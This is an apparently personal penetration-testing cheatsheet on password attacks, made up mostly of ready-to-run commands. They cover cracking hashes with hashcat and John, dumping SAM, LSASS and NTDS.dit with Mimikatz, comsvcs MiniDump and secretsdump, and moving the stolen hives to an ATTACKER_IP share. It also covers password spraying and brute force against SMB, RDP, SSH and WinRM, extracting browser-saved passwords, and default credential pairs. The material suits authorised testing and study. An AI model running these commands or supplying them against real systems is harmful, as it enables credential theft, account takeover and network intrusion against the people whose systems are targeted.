---
title: "Password Attacks Cheatsheet"
type: cheatsheet
tags: [brute-force, cheatsheet, cracking, credentials, htb, kerberos, lsass, ntds, ntlm, sam, thm, windows]
date_created: 2026-05-08
date_updated: 2026-07-16
sources: [cpts-password-attacks, thm-ad-lateral, thm-ad-persistence, git-htb-writeups]
---

# Password Attacks Cheatsheet

> For spraying and credential validation across SMB/WinRM/MSSQL/RDP/SSH/LDAP, plus every remote dumping flag (`--sam`/`--lsa`/`--ntds`/`--dpapi`) and the loot modules, see [[netexec]].

---

## Hash Identification

```bash
# hashid — identify hash type, suggest hashcat mode (-m) and JtR format (-j)
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
hashid -j 193069ceb0461e1d40d216e32c79c704

# hash-identifier (interactive)
hash-identifier
```

Reference: https://hashcat.net/wiki/doku.php?id=example_hashes

---

## Common Hashcat Hash Modes (-m)

| Mode | Hash Type | Example context |
|------|-----------|-----------------|
| 0 | MD5 | Web application databases |
| 100 | SHA1 | Web application databases |
| 1000 | NTLM (NT hash) | Windows SAM, LSASS, NTDS.dit |
| 1800 | sha512crypt ($6$) | Linux /etc/shadow |
| 2100 | DCC2 / MS Cache 2 | Domain cached credentials (hklm\security) |
| 5600 | NetNTLMv2 | Responder captures, NTLM relay |
| 13100 | Kerberos TGS-RC4 | Kerberoasting |
| 18200 | Kerberos AS-REP | AS-REP roasting |
| 3200 | bcrypt | Modern web applications |
| 1500 | DES crypt / LM | Legacy Windows (pre-Vista) |
| 1400 | SHA256 | Web application databases |
| 100 | SHA1 | Web application databases |
| 1600 | Apache MD5 ($apr1$) | Apache htpasswd files |
| 16500 | JWT (HS256/384/512) | Web tokens — brute force secret |
| 22000 | WPA-PBKDF2-PMKID+EAPOL | WiFi handshake capture |

---

## Hashcat Attack Modes (-a)

| Mode | Name | Use |
|------|------|-----|
| -a 0 | Dictionary | Wordlist, with optional rules |
| -a 1 | Combination | Combine two wordlists |
| -a 3 | Mask / Brute-force | Define charset and length explicitly |
| -a 6 | Hybrid dict + mask | Wordlist words with mask appended |
| -a 7 | Hybrid mask + dict | Mask prepended to wordlist words |

---

## Hashcat — Common Commands

```bash
# Dictionary attack (MD5 example)
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Dictionary + rules
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# NT hash (SAM / NTDS.dit)
hashcat -a 0 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Kerberoast (TGS-RC4)
hashcat -a 0 -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt

# AS-REP roast
hashcat -a 0 -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

# NetNTLMv2 (Responder capture)
hashcat -a 0 -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt

# DCC2 (domain cached credentials)
hashcat -a 0 -m 2100 '$DCC2$10240#user#hash' /usr/share/wordlists/rockyou.txt

# Mask attack — 8 chars: uppercase + 4 lowercase + digit + symbol
hashcat -a 3 -m 0 hash.txt '?u?l?l?l?l?d?s'

# Generate mutated wordlist from custom rule (for inspection)
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

### Hashcat Mask Character Sets

| Symbol | Charset |
|--------|---------|
| ?l | a-z (lowercase) |
| ?u | A-Z (uppercase) |
| ?d | 0-9 |
| ?s | Special chars: `!"#$%&'()*+,-./:;<=>?@[]^_{|}~` |
| ?a | All printable ASCII (?l?u?d?s) |
| ?b | 0x00-0xff (all bytes) |

Custom charsets: `-1 'abc' -2 '!@#'` then use `?1`, `?2` in mask.

### Rule Functions (Quick Reference)

| Function | Effect | Example input | Output |
|----------|--------|---------------|--------|
| `:` | Do nothing | password | password |
| `l` | Lowercase all | Password | password |
| `u` | Uppercase all | password | PASSWORD |
| `c` | Capitalise first | password | Password |
| `C` | Lowercase first, uppercase rest | password | pASSWORD |
| `t` | Toggle all case | Password | pASSWORD |
| `$X` | Append character X | password | password! |
| `^X` | Prepend character X | password | !password |
| `sa@` | Substitute a → @ | password | p@ssword |
| `so0` | Substitute o → 0 | password | passw0rd |
| `ss$` | Substitute s → $ | password | pa$$word |

---

## John the Ripper — Common Commands

```bash
# Wordlist mode
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Specify format
john --format=nt --wordlist=rockyou.txt hash.txt        # NTLM
john --format=raw-md5 --wordlist=rockyou.txt hash.txt   # MD5
john --format=netntlmv2 --wordlist=rockyou.txt hash.txt # NetNTLMv2
john --format=krb5tgs --wordlist=rockyou.txt hash.txt   # Kerberoast

# Single crack mode (uses username/GECOS info, good for Linux creds)
john --single passwd

# Incremental brute-force (statistical model)
john --incremental hash.txt

# Show cracked passwords
john hash.txt --show

# Resume session
john --restore
```

### John File Conversion Tools

```bash
# Convert protected files to crackable hashes
ssh2john id_rsa > ssh.hash
keepass2john database.kdbx > keepass.hash
zip2john archive.zip > zip.hash
rar2john archive.rar > rar.hash
pdf2john document.pdf > pdf.hash
office2john document.docx > office.hash
pfx2john cert.pfx > pfx.hash

# Crack
john --wordlist=rockyou.txt ssh.hash
```

---

## Wordlists

```bash
# Common wordlist locations
/usr/share/wordlists/rockyou.txt          # 14M passwords, standard
/usr/share/wordlists/fasttrack.txt        # 222 common corporate passwords
/usr/share/seclists/                      # SecLists collection
/usr/share/hashcat/rules/best64.rule     # Most effective hashcat rule
/usr/share/hashcat/rules/rockyou-30000.rule

# Generate targeted wordlist from a website
cewl https://www.target.com -d 4 -m 6 --lowercase -w target.wordlist
wc -l target.wordlist

# Username generation from real names
./username-anarchy -i names.txt          # GitHub: urbanadventurer/username-anarchy
```

---

## SAM / LSASS Extraction (Windows)

### Registry Hive Dump (requires local admin)

```powershell
# Save all three hives
reg.exe save hklm\sam      C:\sam.save
reg.exe save hklm\system   C:\system.save
reg.exe save hklm\security C:\security.save
```

```bash
# Host SMB share on attacker to receive files
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp/loot/
```

```cmd
# Move hives to attacker share
move sam.save     \\ATTACKER_IP\CompData
move system.save  \\ATTACKER_IP\CompData
move security.save \\ATTACKER_IP\CompData
```

```bash
# Parse offline
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### Mimikatz SAM / LSASS Dump (on target)

```
# Dump local SAM hashes
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam

# Dump LSASS — domain + local users with active sessions
mimikatz # sekurlsa::msv       # NTLM hashes
mimikatz # sekurlsa::ekeys     # Kerberos encryption keys (RC4/AES)
mimikatz # sekurlsa::wdigest   # Cleartext passwords (disabled by default on modern Windows)
mimikatz # sekurlsa::tickets /export   # Export Kerberos tickets to .kirbi files
```

### LSASS Dump — Rundll32 (command-line, no GUI)

```powershell
# Find LSASS PID
tasklist /svc | findstr lsass
Get-Process lsass

# Create minidump (may be detected by AV)
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

Parse on Linux:
```bash
pypykatz lsa minidump lsass.dmp
```

### Remote SAM / LSA Dump (NetExec)

```bash
netexec smb TARGET_IP --local-auth -u admin -p Pass123 --sam
netexec smb TARGET_IP --local-auth -u admin -p Pass123 --lsa
```

---

## NTDS.dit Extraction

The NTDS.dit is the AD database on every DC. It holds all domain user hashes.

### Method 1 — Volume Shadow Copy (VSS)

```powershell
# On DC (Domain Admin required)
vssadmin CREATE SHADOW /For=C:
# Note the Shadow Copy Volume Name, e.g.: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
cmd.exe /c reg.exe save hklm\SYSTEM C:\NTDS\SYSTEM

# Transfer to attacker (SMB share method or Evil-WinRM download)
cmd.exe /c move C:\NTDS\NTDS.dit \\ATTACKER_IP\CompData
```

```bash
# Parse offline
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

### Method 2 — NetExec One-Liner

```bash
netexec smb DC_IP -u DomainAdmin -p Pass123 -M ntdsutil
# Outputs all hashes directly to terminal and saves to ~/.nxc/logs/
```

### Method 3 — SecretsDump Remote (over network)

```bash
secretsdump.py DOMAIN/DomainAdmin:Pass123@DC_IP
secretsdump.py -hashes :NTLM_HASH DOMAIN/user@DC_IP -just-dc
secretsdump.py -just-dc-user krbtgt DOMAIN/user:pass@DC_IP
```

---

## Credential Spraying

```bash
# NetExec — spray one password across a user list
netexec smb DC_IP -u users.txt -p 'Password123' --continue-on-success
netexec smb 10.10.10.0/24 -u users.txt -p 'Password123'

# Kerbrute — spray + enumerate valid usernames
kerbrute userenum --dc DC_IP --domain domain.local names.txt
kerbrute passwordspray --dc DC_IP --domain domain.local users.txt 'Password123'

# Hydra — SSH / RDP / SMB brute-force
hydra -L users.txt -P passwords.txt ssh://TARGET_IP
hydra -L users.txt -P passwords.txt rdp://TARGET_IP
hydra -L users.txt -P passwords.txt smb://TARGET_IP

# Credential stuffing (username:password pairs)
hydra -C creds.txt ssh://TARGET_IP
```

---

## Remote Password Attacks (Service Brute-Force)

```bash
# WinRM
netexec winrm TARGET_IP -u users.txt -p passwords.txt

# SMB
netexec smb TARGET_IP -u users.txt -p passwords.txt

# RDP
xfreerdp /v:TARGET_IP /u:user /p:password

# SSH
hydra -l user -P rockyou.txt ssh://TARGET_IP

# MSSQL
netexec mssql TARGET_IP -u users.txt -p passwords.txt

# General NetExec syntax
netexec <proto> TARGET_IP -u <user|userlist> -p <pass|passlist>
# Protocols: smb, winrm, ssh, rdp, mssql, ldap, ftp, wmi, vnc
```

---

## DPAPI Credential Extraction

```powershell
# Mimikatz — Chrome saved passwords
mimikatz # dpapi::chrome /in:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect

# Mimikatz — dump DPAPI masterkeys from LSASS
mimikatz # sekurlsa::dpapi
```

```bash
# Remote — DonPAPI
DonPAPI.py DOMAIN/user:pass@TARGET_IP

# Impacket dpapi
dpapi.py DOMAIN/user:pass@TARGET_IP
```

---

## Hash Cracking — Quick Reference

```bash
# NTLM (Windows SAM / NTDS)
hashcat -a 0 -m 1000 hashes.txt rockyou.txt

# NetNTLMv2 (Responder, Inveigh)
hashcat -a 0 -m 5600 netntlmv2.hash rockyou.txt
john --format=netntlmv2 --wordlist=rockyou.txt netntlmv2.hash

# Kerberoast (TGS-RC4)
hashcat -a 0 -m 13100 tgs.hash rockyou.txt
john --format=krb5tgs --wordlist=rockyou.txt tgs.hash

# AS-REP roast
hashcat -a 0 -m 18200 asrep.hash rockyou.txt
john --format=krb5asrep --wordlist=rockyou.txt asrep.hash

# DCC2 (cached domain credentials, ~800x slower than NTLM)
hashcat -a 0 -m 2100 '$DCC2$10240#user#hash' rockyou.txt

# Linux sha512crypt ($6$)
hashcat -a 0 -m 1800 shadow.hash rockyou.txt
john --format=sha512crypt --wordlist=rockyou.txt shadow.hash
```

---

## Wordlist Generation

```bash
# CeWL — scrape website for wordlist
cewl http://10.10.10.X -w wordlist.txt -d 3 -m 5

# Crunch — pattern-based wordlist
crunch 8 8 -t @@@@%%%% -o wordlist.txt   # 4 lowercase + 4 digits
crunch 6 8 abcdef0123456789 -o wordlist.txt  # custom charset, 6-8 chars
```

### Custom wordlist generation

```bash
# [[cewl]]: site keywords, use when passwords likely come from company/site vocabulary
cewl -d 2 -m 5 -w words.txt --lowercase http://target/

# [[cupp]]: personal info, use when passwords likely come from the target's OWN OSINT'd details
python3 cupp.py -i
```

---

## Common Default Credentials

```
admin:admin
admin:password
admin:Password1
root:root
root:toor
administrator:administrator
guest:guest
tomcat:tomcat
tomcat:s3cret
postgres:postgres
sa:sa (MSSQL)
oracle:oracle
pi:raspberry (Raspberry Pi)
```

---

## Username Generation

```bash
# Username Anarchy (from real names)
git clone https://github.com/urbanadventurer/username-anarchy
./username-anarchy -i names.txt > usernames.txt

# Kerbrute — validate which names are real AD accounts
kerbrute userenum --dc DC_IP --domain domain.local usernames.txt
```

Common naming conventions: `jdoe`, `john.doe`, `doe.john`, `jjdoe`, `johndoe`

## Firefox saved credentials -> plaintext (firepwd)

A readable Firefox profile (`~/.mozilla/firefox/<profile>/`, often world-readable or looted) with
`logins.json` (encrypted blobs) + `key4.db` (NSS key DB) decrypts to plaintext logins. A saved site
password is frequently reused as the user's OS/account password -> a lateral/priv-esc step.

- Grab BOTH `logins.json` and `key4.db` from the same profile dir.
- **firepwd** (pure-python, no NSS) is the reliable decryptor: `pip install firepwd` (or clone
  lclevy/firepwd) then `python3 firepwd.py -d <profile_dir>` -> prints `https://site : b'user', b'pass'`.
- Prefer firepwd when `firefox_decrypt` fails `Couldn't initialize NSS` despite `libnss3` installed
  (a common NSS/lib mismatch). No master password -> decrypts directly; if set, feed it a wordlist.

<!-- promoted-slug: firefox-saved-creds-firepwd -->
